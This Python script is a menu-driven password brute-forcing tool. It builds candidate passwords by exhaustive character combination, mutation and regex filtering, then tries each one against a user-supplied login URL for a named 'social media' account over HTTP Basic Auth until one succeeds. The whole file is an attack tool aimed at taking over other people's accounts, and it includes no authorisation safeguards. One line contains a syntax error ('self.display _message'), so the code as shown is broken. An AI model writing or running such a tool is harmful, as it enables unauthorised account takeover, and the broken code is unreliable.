import requests
import re
import itertools
from requests.auth import HTTPBasicAuth

class TheForcePasswordTool:
    def __init__(self):
        self.passwords = []

    def display_message(self, message, color='black'):
        print(message)

    def generate_passwords(self, min_length: int, max_length: int, charset: str):
        try:
            passwords = list(self.generate_passwords_helper(min_length, max_length, charset))
            return passwords
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')
            return []

    def generate_passwords_helper(self, min_length: int, max_length: int, charset: str):
        if min_length > max_length:
            raise ValueError('Minimum length cannot be greater than maximum length.')
        passwords = []
        for length in range(min_length, max_length + 1):
            for password_tuple in itertools.product(charset, repeat=length):
                password = ''.join(password_tuple)
                passwords.append(password)
        return passwords

    def apply_mutations(self, mutation_rules):
        try:
            mutated_passwords = list(self.apply_mutations_helper(self.passwords, mutation_rules))
            return mutated_passwords
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')
            return []

    def apply_mutations_helper(self, passwords, mutation_rules):
        mutated_passwords = []
        for password in passwords:
            for rule in mutation_rules:
                action, *details = rule.split()
                if action == 'upper':
                    index = int(details[0])
                    mutated_passwords.append(password[:index] + password[index].upper() + password[index + 1:])
                elif action == 'lower':
                    index = int(details[0])
                    mutated_passwords.append(password[:index] + password[index].lower() + password[index + 1:])
                elif action == 'insert':
                    index, char = details
                    mutated_passwords.append(password[:int(index)] + char + password[int(index):])
                elif action == 'replace':
                    index, char = details
                    mutated_passwords.append(password[:int(index)] + char + password[int(index) + 1:])
                elif action == 'delete':
                    index = int(details[0])
                    mutated_passwords.append(password[:index] + password[index + 1:])
        return mutated_passwords

    def apply_filters(self, regex_filters):
        try:
            filtered_passwords = list(self.apply_filters_helper(self.passwords, regex_filters))
            return filtered_passwords
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')
            return []

    def apply_filters_helper(self, passwords, regex_filters):
        filtered_passwords = []
        for password in passwords:
            if all(re.fullmatch(pattern.strip(), password) for pattern in regex_filters):
                filtered_passwords.append(password)
        return filtered_passwords

    def bruteforce_password(self, username: str, url: str, social_media: str):
        try:
            for password in self.passwords:
                try:
                    response = requests.get(url, auth=HTTPBasicAuth(username, password))
                    if response.status_code == 200:
                        self.display_message(f'Successfully logged in to {social_media} with password: {password}', color='green')
                        return
                except requests.exceptions.RequestException as ex:
                    self.display_message(f'Error while trying to log in: {ex}', color='red')
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')

    def run(self):
        print("Welcome to TheForce Password Tool")
        while True:
            print("\nOptions:")
            print("1. Generate Passwords")
            print("2. Apply Mutations")
            print("3. Apply Filters")
            print("4. Bruteforce Password")
            print("5. Exit")

            choice = input("Select an option (1-5): ")

            if choice == '1':
                min_length = int(input("Enter minimum password length: "))
                max_length = int(input("Enter maximum password length: "))
                charset = input("Enter character set: ")
                self.passwords = self.generate_passwords(min_length, max_length, charset)
                if self.passwords:
                    self.display_message("Passwords generated successfully!", color='green')
                else:
                    self.display _message("No passwords generated.", color='red')

            elif choice == '2':
                if not self.passwords:
                    self.display_message("No passwords available. Please generate passwords first.", color='red')
                else:
                    mutation_rules_input = input("Enter mutation rules (e.g., upper 2, insert 5 !): ")
                    mutation_rules = [rule.strip() for rule in mutation_rules_input.split(',')]
                    self.passwords = self.apply_mutations(mutation_rules)
                    if self.passwords:
                        self.display_message("Mutations applied successfully!", color='green')
                    else:
                        self.display_message("No mutated passwords.", color='red')

            elif choice == '3':
                if not self.passwords:
                    self.display_message("No passwords available. Please generate or mutate passwords first.", color='red')
                else:
                    regex_filters_input = input("Enter regex filters (e.g., [a-z], [0-9]): ")
                    regex_filters = [filter.strip() for filter in regex_filters_input.split(',')]
                    self.passwords = self.apply_filters(regex_filters)
                    if self.passwords:
                        self.display_message("Filters applied successfully!", color='green')
                    else:
                        self.display_message("No passwords after applying filters.", color='red')

            elif choice == '4':
                if not self.passwords:
                    self.display_message("No passwords available. Please generate, mutate, or filter passwords first.", color='red')
                else:
                    username = input("Enter username: ")
                    url = input("Enter login URL: ")
                    social_media = input("Enter social media name: ")
                    self.bruteforce_password(username, url, social_media)

            elif choice == '5':
                print("Exiting TheForce Password Tool. Goodbye!")
                break

            else:
                self.display_message("Invalid choice. Please select a valid option (1-5).", color='red')

if __name__ == '__main__':
    app = TheForcePasswordTool()
    app.run()
